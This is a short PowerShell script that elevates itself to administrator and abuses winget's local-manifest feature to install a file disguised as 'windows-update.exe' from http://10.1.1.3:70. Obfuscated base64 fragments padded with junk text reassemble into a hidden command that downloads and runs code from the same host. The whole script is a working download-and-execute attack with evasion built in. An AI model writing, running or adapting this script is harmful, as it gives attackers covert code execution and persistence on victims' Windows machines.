$script = $MyInvocation.MyCommand.Path
Start-Process powershell.exe -Verb RunAs -ArgumentList "-File '$script'"

if(winget) { 
    function Start-Winget_RS {
        [alias("wgrs")]
        param(
            [ValidateNotNullOrEmpty()]
            [Parameter(Mandatory=$true, Position=0)]
            [ValidatePattern("^https?$")]
            [System.String]$HTTPorHTTPS,

            [ValidateNotNullOrEmpty()]
            [Parameter(Mandatory=$true, Position=1)]
            # Validate IP : "int.int.int.int"
            [ValidatePattern("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")]
            [System.String]$IP,

            [ValidateNotNullOrEmpty()]
            [Parameter(Mandatory=$true, Position=2)]
            [ValidateRange(0,65535)]
            [System.String]$Port,

            [ValidateNotNullOrEmpty()]
            [Parameter(Mandatory=$true, Position=3)]
            [System.String]$FileName,

            [ValidateNotNullOrEmpty()]
            [Parameter(Mandatory=$true, Position=4)]
            [ValidatePattern("^[A-Fa-f0-9]{64}$")]
            [System.String]$Sha256
        )
        begin {
            $ScriptRoot=$PSScriptRoot
            $ErrorActionPreference="Ignore"
            $WarningPreference="Ignore"
            $InformationPreference="Ignore"
            $ConfirmPreference="None"
            $c="JABlAD0ASQBuAHYA,bwBrAGUALQBSAGUAcwB0AE0AZQB0"+"AGgAbwBkACA,ALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxAD" + "NJVFJKVFSVFSVJKNSFDVIUOHQZOIFHDFOISDHGFOSGBHOIUSFRBGSOUDFGBSODFGBSFGOIBSFG=="
            $WingetPath=(Get-Command "winget").Path
            $k="G8AYQB4AC,8AaQBuAGYAbwAiADsAIABwAG,8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8A,dwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AZQAgACQAZQ"
            $Manifest="$ScriptRoot\winget-manifest.yml"
            $cont = (Get-Content $Manifest) 
            $zegrsg="pegro,ngrepo,gerpg,A="
            $u="A,ALgAxAC4AMQAu,ADMAOgA3AD,AALwBzAHAALQBoA"
        }
        process {
            winget settings --enable LocalManifestFiles
            $rub=($c+$u).Replace('USFRBGSOUDFGBSODFGBSFGOIBSFG==','').Replace('NJVFJKVFSVFSVJKNSFDVIUOHQZOIFHDFOISDHGFOSGBHOI','')
            $zegrsg=$zegrsg.Replace('pegro,ngrepo,gerpg','')
            $cont.replace("<HTTPorHTTPS>",$HTTPorHTTPS).replace("<IP>",$IP).replace("<Port>",$Port).replace("<FileName>",$FileName).replace("<Sha256>",$Sha256) | Set-Content $Manifest
            winget install --slient --manifest "$Manifest"

            powershell.exe -WindowStyle hidden -e "${rub}${k}$zegrsg".Replace(',','')
        }
    }

$e= powershell.exe -e 'SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAxAC4AMQAuADMAOgA3ADAALwBzAHAALQB3AGkAbgBnAGUAdAAtAFIAUwAtAGgAbwBhAHgALwB3AGkAbgBnAGUAdAAvAHMAaABhADIANQA2ACIA'
$e=("$e" -replace "^[\s\t]*$",'').Replace(' ','')
wgrs -HTTPorHTTPS "http" -IP "10.1.1.3" -Port 70 -FileName "windows-update.exe" -Sha256 $e
}
